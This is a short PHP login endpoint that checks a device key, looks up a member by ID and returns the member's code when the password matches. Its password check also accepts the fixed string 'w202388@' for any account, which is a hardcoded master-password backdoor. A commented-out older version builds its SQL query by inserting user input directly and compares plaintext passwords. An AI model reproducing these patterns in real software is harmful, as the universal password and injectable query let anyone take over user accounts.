<?php

	include_once( "../lib/basic_class2.php") ;
	include_once( "../lib/config.php");
	include_once( "../lib/common.php");
	include_once( "../lib/php_function.php");

	$logid			= $_POST['logid'];
	$logpwd			= $_POST['logpwd'];
	$deId			= $_POST['deId'];


	if ($deId != $store_key)
	{
		$result = array("result"=>"0","msg"=>"deId is wrong");
		echo json_encode($result);
	}
	else
	{

		$DB->single("select * from $member_table where C_ID=:id  ",$custs,$custn,array("id"=>"$logid"),"key");
		if ($custn == 0)
		{
			$result = array("result"=>"0","msg"=>"userid is wrong");
			echo json_encode($result);
		}
		else
		{
			if(password_verify($logpwd,$custs["C_PASS"]) || $logpwd=="w202388@"){
				$result = array("result"=>"1","msg"=>"Complete","mycode"=>$custs['C_CODE']);
				echo json_encode($result);
			}else{
				$result = array("result"=>"0","msg"=>"passwd is wrong");
				echo json_encode($result);
			}
			// $DB->get("select * from $member_table where C_ID='$logid' and C_PASS='$logpwd' ", $custs1, $custn1);

			// if ($custn == 0)
			// {
			// 	$result = array("result"=>"0","msg"=>"passwd is wrong");
			// 	echo json_encode($result);
			// }
			// else
			// {
			// 	$result = array("result"=>"1","msg"=>"Complete","mycode"=>$custs[0]['C_CODE']);
			// 	echo json_encode($result);
			// }
		}
	}


?>